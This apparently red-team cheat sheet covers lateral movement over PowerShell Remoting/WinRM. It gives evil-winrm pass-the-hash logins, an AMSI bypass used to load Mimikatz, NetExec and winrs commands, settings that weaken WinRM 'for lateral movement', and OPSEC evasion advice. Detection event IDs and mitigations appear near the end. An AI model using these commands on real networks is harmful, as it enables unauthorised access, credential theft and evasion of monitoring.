# PowerShell Remoting (WinRM)

PowerShell Remoting uses WinRM (WS-Management) to execute commands on remote systems. It is built into modern Windows and Server platforms, and is increasingly the primary management protocol for Windows administration.

## How It Works

1. WinRM listens on port 5985 (HTTP) or 5986 (HTTPS) for SOAP-based WS-Management requests
2. The client authenticates (NTLM or Kerberos) and opens a PowerShell runspace on the remote machine
3. Commands are serialized, sent to the remote runspace, executed, and results are returned
4. WinRM is backed by `WsmSvc.dll` and runs in `svchost.exe` as the network service

## Requirements

| Requirement | Detail |
|-------------|--------|
| Privileges | Local admin OR member of `Remote Management Users` group |
| Port | 5985 (HTTP) / 5986 (HTTPS) |
| Service | WinRM service must be running |
| Auth | NTLM or Kerberos |
| UAC | Remote UAC filters local admin token unless `LocalAccountTokenFilterPolicy=1` |
| PSRemoting | Must be enabled (`Enable-PSRemoting`) |

---

## evil-winrm — Linux WinRM Client

```
# Password authentication
evil-winrm -i 192.168.1.100 -u admin -p 'Password123!'

# NTLM hash authentication (PtH)
evil-winrm -i 192.168.1.100 -u admin -H NTLM_HASH

# Domain user
evil-winrm -i target -u DOMAIN\\admin -p pass

# With SSL (WinRM over HTTPS)
evil-winrm -i target -u admin -p pass -S

# Skip certificate validation
evil-winrm -i target -u admin -p pass -S -k

# Disable path check (evasion)
evil-winrm -i target -u admin -H NTLM -NoPathCheck

# Specify port
evil-winrm -i target -u admin -p pass -P 5985

# Load PowerShell script
evil-winrm -i target -u admin -H NTLM -s /path/to/scripts/

# Upload file
*Evil-WinRM* PS> upload local_script.ps1

# Download file
*Evil-WinRM* PS> download C:\Users\admin\file.txt

# Load script from memory
*Evil-WinRM* PS> menu
*Evil-WinRM* PS> Bypass-4MSI
*Evil-WinRM* PS> Invoke-Mimikatz.ps1

# Local authentication
evil-winrm -i target -u admin -H HASH -L

# With IP (no domain needed)
evil-winrm -i 192.168.1.100 -u localadmin -H HASH
```

**OPSEC**: evil-winrm runs PowerShell commands in-memory. The `Bypass-4MSI` command patches the AMSI detection context to avoid script detection. WinRM traffic is HTTP/HTTPS and blends with legitimate admin traffic.

---

## Enter-PSSession — Interactive PowerShell Remoting

```powershell
# One-liner interactive session
Enter-PSSession -ComputerName target

# With credentials
$cred = Get-Credential
Enter-PSSession -ComputerName target -Credential $cred

# Specify authentication mechanism
Enter-PSSession -ComputerName target -Authentication Kerberos

# Use SSL
Enter-PSSession -ComputerName target -UseSSL

# Specifying session options (timeout, etc.)
$sessOpt = New-PSSessionOption -IdleTimeout 3600000
Enter-PSSession -ComputerName target -SessionOption $sessOpt

# Using IP address (requires HTTPS or SSL)
Enter-PSSession -ComputerName 192.168.1.100 -UseSSL -SessionOption (New-PSSessionOption -SkipCACheck -SkipCNCheck)

# Create session first, then enter
$s = New-PSSession -ComputerName target -Credential $cred
Enter-PSSession -Session $s
```

---

## Invoke-Command — Non-Interactive Execution

```powershell
# Execute single command
Invoke-Command -ComputerName target -ScriptBlock { whoami }

# With credentials
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock { whoami }

# Execute multiple commands
Invoke-Command -ComputerName target -ScriptBlock {
    $env:COMPUTERNAME
    whoami
    ipconfig
}

# Pass local variables to remote session
$localVar = "value"
Invoke-Command -ComputerName target -ScriptBlock { param($v) Write-Host $v } -ArgumentList $localVar

# Execute on multiple targets
Invoke-Command -ComputerName target1,target2,target3 -ScriptBlock { Get-Service }

# Execute on all domain computers (slow, but effective)
$computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
Invoke-Command -ComputerName $computers -ScriptBlock { whoami }

# Run as different user (with privilege escalation)
Invoke-Command -ComputerName target -ScriptBlock { Start-Process powershell -Verb RunAs }

# Using session objects for multiple commands
$s = New-PSSession -ComputerName target -Credential $cred
Invoke-Command -Session $s -ScriptBlock { ipconfig }
Invoke-Command -Session $s -ScriptBlock { Get-Process }
Remove-PSSession $s

# Background job on remote machine
Invoke-Command -ComputerName target -AsJob -ScriptBlock { Start-Sleep 60; whoami }

# File copy via WinRM
Copy-Item -Path local.exe -Destination C:\temp\remote.exe -ToSession $s
Copy-Item -Path C:\temp\result.txt -Destination local.txt -FromSession $s

# With explicit authentication
Invoke-Command -ComputerName target -Authentication Credssp -Credential $cred -ScriptBlock { whoami }
```

---

## New-PSSession — Persistent Session Objects

```powershell
# Create session as reusable object
$s = New-PSSession -ComputerName target -Credential $cred

# Run multiple commands in same session
Invoke-Command -Session $s -ScriptBlock { $data = Import-Module ActiveDirectory }
Invoke-Command -Session $s -ScriptBlock { Get-ADUser -Filter * }

# Export session for later use
Export-Clixml -Path session.xml -InputObject $s
Import-Clixml -Path session.xml

# Session configuration
$s = New-PSSession -ComputerName target -SessionOption (New-PSSessionOption -NoMachineProfile)

# Disconnect and reconnect (for long-running tasks)
$s = New-PSSession -ComputerName target
Invoke-Command -Session $s -ScriptBlock { Start-Sleep 60; Get-Process } -InDisconnectedSession
Get-PSSession -ComputerName target | Connect-PSSession
```

---

## winrs — Native Windows Remote Shell

```
# Execute command via WinRS
winrs -r:target cmd /c whoami

# With credentials
winrs -r:target -u:DOMAIN\admin -p:Password123! whoami

# Remote PowerShell
winrs -r:target powershell -enc BASE64

# Specify authentication
winrs -r:target -auth:Kerberos whoami

# Interactive shell via winrs
winrs -r:target cmd

# With SSL
winrs -r:https://target:5986 whoami

# Unencrypted (HTTP)
winrs -r:target -unencrypted whoami
```

**OPSEC**: `winrs.exe` is a native Windows binary but usage is uncommon in most organizations and may be flagged as anomalous.

---

## NetExec over WinRM

```
# Command execution
nxc winrm 192.168.1.100 -u admin -p pass -x whoami

# With NTLM hash
nxc winrm target -u admin -H NTLM_HASH -x whoami

# PowerShell command
nxc winrm target -u admin -p pass -X 'Get-Service'

# With SSL
nxc winrm target -u admin -p pass -x whoami --port 5986

# Local authentication
nxc winrm target -u admin -H HASH --local-auth -x whoami

# Domain user
nxc winrm target -u DOMAIN\\admin -p pass -x whoami

# Protocol selection (winrm vs smb)
nxc winrm target -u admin -p pass -x whoami --protocol winrm

# Enumeration module
nxc winrm target -u admin -H HASH -M enum_av
```

---

## WinRM Quick Configuration (from the target)

```powershell
# Check WinRM status
winrm get winrm/config/client
winrm get winrm/config/service

# Enable PowerShell Remoting
Enable-PSRemoting -Force

# Trust all hosts (for lateral movement)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value *

# Set to allow unencrypted traffic
Set-Item WSMan:\localhost\Client\AllowUnencrypted -Value $true

# Set explicit credentials
Set-Item WSMan:\localhost\Client\DefaultPorts\HTTP -Value 5985

# Enable WinRM with custom configuration
winrm quickconfig -q
winrm set winrm/config/service/auth '@{Basic="true"}'
winrm set winrm/config/service '@{AllowUnencrypted="true"}'

# Configure HTTPS listener
New-SelfSignedCertificate -DnsName $env:computername -CertStoreLocation Cert:\LocalMachine\My
New-WSManInstance -ResourceURI winrm/config/Listener -SelectorSet @{Address="*";Transport="HTTPS"} -ValueSet @{CertificateThumbprint="THUMBPRINT"}
```

---

## OPSEC Considerations

| Factor | Risk Level | Notes |
|--------|------------|-------|
| WinRM traffic | Low | Blends with legitimate admin activity |
| PowerShell logging | High | Script block logging (4104) captures all commands |
| Module logging | High | PowerShell module logging captures cmdlet usage |
| AMSI | Medium | evil-winrm bypasses AMSI with Bypass-4MSI |
| 5985/5986 | Low | Common ports, often allowed |
| Kerberos delegation | Medium | Double-hop issue — CredSSP or Kerberos delegation needed |
| Session persistence | Medium | Disconnected sessions linger (Get-PSSession) |
| WinRM group membership | Medium | Domain admins, local admins, or Remote Management Users |

### The Double-Hop Problem

PowerShell Remoting authenticates to the first machine (hop 1) but cannot pass credentials to a second machine (hop 2) without CredSSP or Kerberos delegation:

```powershell
# This fails (double-hop):
Invoke-Command -ComputerName server1 -ScriptBlock {
    Invoke-Command -ComputerName server2 -ScriptBlock { whoami }
    # ^ This runs as server1$, not as the user
}

# Solutions:
# 1. CredSSP (allows credential delegation)
Invoke-Command -ComputerName server1 -Authentication Credssp -Credential $cred -ScriptBlock { ... }

# 2. Use credential objects in the script block
$cred = Get-Credential
Invoke-Command -ComputerName server1 -ScriptBlock {
    param($c)
    Invoke-Command -ComputerName server2 -Credential $c -ScriptBlock { whoami }
} -ArgumentList $cred

# 3. Use Kerberos with unconstrained delegation (requires specific setup)
Invoke-Command -ComputerName server1 -Authentication Kerberos -ScriptBlock { ... }

# 4. Use session proxy (PSSessionConfiguration)
Register-PSSessionConfiguration -Name ProxyConfig -SessionType DefaultRemoteShell
```

---

## Detection

| Event ID | Source | Indication |
|----------|--------|------------|
| 4624 | Security | LogonType 3 (Network — WinRM auth, LogonType 10 if credential delegation) |
| 4648 | Security | Explicit credential logon |
| 4688 | Security | Process creation from WinRM (cmd.exe via svchost.exe) |
| 4103 | PowerShell | Module logging — `Invoke-Command`, `Enter-PSSession` usage |
| 4104 | PowerShell | Script block logging — captures all remote commands |
| 53504 | PowerShell | PowerShell Named Pipe IPC |
| 5156 | Security | WFP connection to target:5985 |
| 200 | WinRM | WinRM operation |
| 6 | WinRM | WinRM listener creation |
| 91 | WinRM | WinRM session creation |
| 3 | Sysmon | Network connection to 5985/5986 |
| 7 | Sysmon | DLL load — `wsmprov.dll`, `WsmSvc.dll` |

**Detection logic**:
- PowerShell 4104 events showing remote commands across multiple machines
- Multiple 4624 LogonType 3 from a single source to many targets via WinRM
- Process creation where parent is `svchost.exe` with WinRM service DLLs
- Lateral movement detection via WinRM anomalies: unusual times, volumes, or source machines
- Network logons with `Authentication Package: Negotiate` and `LogonType 3` from management tooling
- Event 4104 with `Invoke-Command -ComputerName` patterns across many targets

## Mitigation

| Control | Detail |
|---------|--------|
| Just Enough Administration (JEA) | Constrain what PowerShell cmdlets can be used over WinRM |
| Just In Time (JIT) Admin | Grant admin rights only temporarily |
| WinRM Audit | Monitor and restrict WinRM client access |
| Firewall | Restrict 5985/5986 access to specific admin workstations |
| PowerShell Logging | Enable script block and module logging |
| Constrained Language Mode | Limit PowerShell to constrained mode for non-admin users |
| WinRM group restriction | Control membership of Remote Management Users |
| CredSSP restriction | Disable CredSSP if not needed (prevents double-hop credential theft) |

## When to Use PowerShell Remoting

- **Windows-native administration** — intended for management, blends in
- **Stealth required** — over HTTPS, no service creation, no file drops
- **WinRM already enabled** — most domain-joined servers have it on
- **Need PowerShell capabilities** — full PowerShell environment remotely
- **Script execution** — run complex scripts on remote hosts (BloodHound, PowerView, etc.)
- **Evil-WinRM** — best option for Linux attackers targeting WinRM

## When NOT to Use PowerShell Remoting

- **WinRM disabled** — not enabled by default on client OS
- **Organizations monitor 4104 events** — script block logging captures all commands
- **No admin access** — Remote Management Users group may not be sufficient
- **Host-based firewall blocks 5985/5986** — common in segmented networks
- **AMSI/EDR present** — PowerShell execution is heavily monitored
